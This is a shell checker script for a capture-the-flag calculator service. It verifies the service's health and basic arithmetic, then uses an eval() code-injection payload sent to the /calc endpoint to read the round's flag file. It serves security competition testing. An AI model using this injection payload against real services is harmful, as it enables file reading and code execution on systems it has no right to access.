#!/bin/sh
#
# Checker for gzctf/calc-python:test.
#
#   SLA      : /health up, plus /calc?expr=6*7 == "42" (real functionality).
#   GET flag : exploit the eval() RCE to read the round flag from the service's
#              own GZCTF_FLAG_FILE, then match it.
#
# Exit: 0=Ok, 1=Mumble, 2=Offline, 3=InternalError.
set -u

if [ -z "${GZCTF_TARGET_IP:-}" ] || [ -z "${GZCTF_TARGET_PORT:-}" ]; then
    echo "missing GZCTF_TARGET_IP / GZCTF_TARGET_PORT" >&2
    exit 3
fi
B="http://${GZCTF_TARGET_IP}:${GZCTF_TARGET_PORT}"

if ! curl -sS --max-time 5 -o /dev/null "$B/health"; then
    echo "health unreachable" >&2
    exit 2
fi

# Functionality: a deterministic computation.
ans="$(curl -sS --max-time 5 -G "$B/calc" --data-urlencode 'expr=6*7' 2>&1)"
if [ "$ans" != "42" ]; then
    echo "calc broken: 6*7 -> '$(printf '%s' "$ans" | head -c 100)'" >&2
    exit 1
fi

if [ -z "${GZCTF_FLAG:-}" ]; then
    echo "no GZCTF_FLAG (warmup)" >&2
    exit 1
fi

# Get flag via the eval RCE: read the service's own flag file.
expr="open(__import__('os').environ.get('GZCTF_FLAG_FILE','/flag')).read().strip()"
flag="$(curl -sS --max-time 5 -G "$B/calc" --data-urlencode "expr=$expr" 2>&1)"
case "$flag" in
    *"$GZCTF_FLAG"*) exit 0 ;;
    *)
        echo "flag read via eval mismatch: $(printf '%s' "$flag" | head -c 100)" >&2
        exit 1
        ;;
esac
